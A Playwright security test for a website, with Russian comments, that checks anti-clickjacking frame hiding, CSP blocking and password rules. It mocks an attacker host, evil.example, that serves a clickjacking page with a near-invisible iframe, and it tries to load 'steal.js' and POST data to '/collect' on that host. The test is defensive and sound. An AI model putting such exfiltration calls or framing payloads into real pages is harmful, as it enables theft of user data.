// Защита сайта: «невидимая рамка», правила CSP, пароль. Сайт отдаётся с адреса github.io (через подмену сети).
const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');
const DOCS = path.resolve(__dirname, '../../docs');
const SITE = 'https://vezin0v0-cmyk.github.io/my-project/docs/';
const results = [];
const check = (n, ok, extra) => results.push((ok ? 'PASS ' : 'FAIL ') + n + (ok || extra === undefined ? '' : ' :: ' + JSON.stringify(extra).slice(0, 300)));

(async () => {
  const b = await chromium.launch();
  const ctx = await b.newContext({ viewport: { width: 1280, height: 800 } });
  await ctx.route('https://vezin0v0-cmyk.github.io/**', route => {
    const u = new URL(route.request().url());
    const rel = decodeURIComponent(u.pathname.replace('/my-project/docs/', '')) || 'index.html';
    const file = path.join(DOCS, rel);
    if (!file.startsWith(DOCS) || !fs.existsSync(file)) return route.fulfill({ status: 404, body: 'nf' });
    const type = file.endsWith('.html') ? 'text/html; charset=utf-8' : file.endsWith('.js') ? 'application/javascript' : file.endsWith('.jpg') ? 'image/jpeg' : 'application/octet-stream';
    route.fulfill({ status: 200, headers: { 'content-type': type }, body: fs.readFileSync(file) });
  });
  // Supabase: сессии нет.
  await ctx.route('https://udnjvgvdiyfafsiqdkox.supabase.co/**', route => route.fulfill({ status: 401, headers: { 'access-control-allow-origin': '*', 'content-type': 'application/json' }, body: '{"msg":"no"}' }));
  await ctx.route('https://evil.example/**', route => route.fulfill({
    status: 200, headers: { 'content-type': 'text/html' },
    body: `<html><body><h1>Win a prize!</h1><iframe id=f src="${SITE}app.html#register"></iframe><iframe id=g src="${SITE}privacy.html" style="opacity:0.01;position:absolute;top:0;left:0;width:1200px;height:800px"></iframe></body></html>`
  }));

  for (const pageName of ['index.html', 'app.html', 'privacy.html']) {
    const p = await ctx.newPage();
    const errors = [];
    p.on('console', m => { if (m.type() === 'error') errors.push(m.text()); });
    p.on('pageerror', e => errors.push(e.message));
    await p.goto(SITE + pageName);
    await p.waitForTimeout(1500);
    const display = await p.evaluate(() => getComputedStyle(document.documentElement).display);
    check(pageName + ' visible when opened directly', display !== 'none', display);
    check(pageName + ' no CSP/JS errors', errors.filter(e => !/401|Failed to load resource/.test(e)).length === 0, errors);
    // Чужой скрипт не загружается.
    const blocked = await p.evaluate(() => new Promise(res => {
      const s = document.createElement('script');
      s.src = 'https://evil.example/steal.js';
      s.onload = () => res(false); s.onerror = () => res(true);
      document.head.appendChild(s);
      setTimeout(() => res(true), 2000);
    }));
    check(pageName + ' blocks foreign scripts', blocked);
    const fetchBlocked = await p.evaluate(() => fetch('https://evil.example/collect', { method: 'POST', body: 'x' }).then(() => false, () => true));
    check(pageName + ' blocks sending data elsewhere', fetchBlocked);
    await p.close();
  }

  // Кабинет внутри чужой страницы — скрыт.
  const evil = await ctx.newPage();
  await evil.goto('https://evil.example/');
  await evil.waitForTimeout(2000);
  const frame = evil.frames().find(f => f.url().includes('app.html'));
  let hidden = null;
  if (frame) { try { hidden = await frame.evaluate(() => getComputedStyle(document.documentElement).display === 'none'); } catch (e) { hidden = 'navigated:' + evil.url(); } }
  check('framed app is hidden (anti-clickjacking)', hidden === true || String(hidden).startsWith('navigated:' + SITE), { hidden, top: evil.url() });
  const pf = evil.frames().find(f => f.url().includes('privacy.html'));
  let phidden = null;
  if (pf) { try { phidden = await pf.evaluate(() => getComputedStyle(document.documentElement).display === 'none'); } catch (e) { phidden = 'navigated'; } }
  check('framed privacy page is hidden', phidden === true || phidden === 'navigated' || evil.url().startsWith(SITE), { phidden });

  // Пароль без цифр не проходит уже в форме.
  const p = await ctx.newPage();
  await p.goto(SITE + 'app.html#register');
  await p.waitForSelector('#view-register:not([hidden])');
  await p.waitForTimeout(800);
  await p.fill('#r-name', 'Тест');
  await p.fill('#r-email', 'test@mail.ru');
  await p.fill('#r-pass', 'onlyletters');
  await p.fill('#r-pass2', 'onlyletters');
  await p.click('#terms-label i');
  await p.click('#form-register [type=submit]');
  await p.waitForTimeout(300);
  const err = await p.$$eval('#form-register .err', els => els.map(e => e.textContent).join('|'));
  check('password without digits rejected', err.includes('латинские буквы'), err);

  await b.close();
  console.log(results.join('\n'));
  const failed = results.some(r => !r.startsWith('PASS'));
  console.log(failed ? 'SOME FAILED' : 'ALL PASS');
  process.exitCode = failed ? 1 : 0;
})();
